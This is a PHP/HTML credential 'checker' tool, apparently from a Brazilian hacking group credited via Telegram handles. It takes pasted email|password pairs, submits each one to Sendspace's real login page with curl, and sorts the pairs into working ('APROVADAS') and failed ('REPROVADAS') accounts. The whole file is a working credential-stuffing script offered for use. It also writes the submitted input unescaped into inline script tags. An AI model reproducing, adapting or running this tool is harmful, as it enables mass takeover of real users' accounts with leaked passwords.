<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" type="text/css" href="estilo.css" />
    <title>CHECKER SENDSPACE</title>
  </head>

  <body>
    <header>
      <h1>CENTRAL OSCKLER</h1>
    </header>

    <section>
      <h1>CHECKER SENDSPACE</h1>
      <form method="post">
        <textarea name="lista"></textarea>
        <input type="submit" value="TESTAR">
      </form>
      <div class="aprovadas">
        APROVADAS
        <textarea readonly name="aprovadas" id="aprovadas"></textarea>
      </div>
      <div class="reprovadas">
        REPROVADAS
        <textarea readonly name="reprovadas" id="reprovadas"></textarea>
      </div>
    </section>

    <footer>
      <h1>Desenvolvido por: &emsp;<a href="https://t.me/Vyrgul">@vyrgul</a></h1>
      <h1>Canal OSCKLER: &emsp;<a href="https://t.me/osckler">@Osckler</a></h1>
      <h1>Grupo OSCKLER: &emsp;<a href="https://t.me/oscklersec">@OscklerSEC</a></h1>
    </footer>
  </body>
</html>

<?php

error_reporting(0);
set_time_limit(0);

$lista = $_POST["lista"];

if (isset($lista)) {
  $linhas = explode("\r\n", $lista);

  foreach ($linhas as $linha) {
    list ($email, $senha) = explode ("|", $linha);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.sendspace.com/login.html");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=login&username='.$email.'&password='.$senha.'&remember=off&submit=Log+In');
    $pos = curl_exec($ch);

    if (strpos($pos, 'Your account status:')) {
      echo "<script>document.getElementById('aprovadas').innerHTML += '✅ APROVADA => $email|$senha  &emsp;#Vyrgul [Central Osckler]&#10;';</script>";
    } else {
      echo "<script>document.getElementById('reprovadas').innerHTML += '❎ REPROVADA => $email|$senha  &emsp;#Vyrgul [Central Osckler]&#10;';</script>";
    }
  }
}

?>
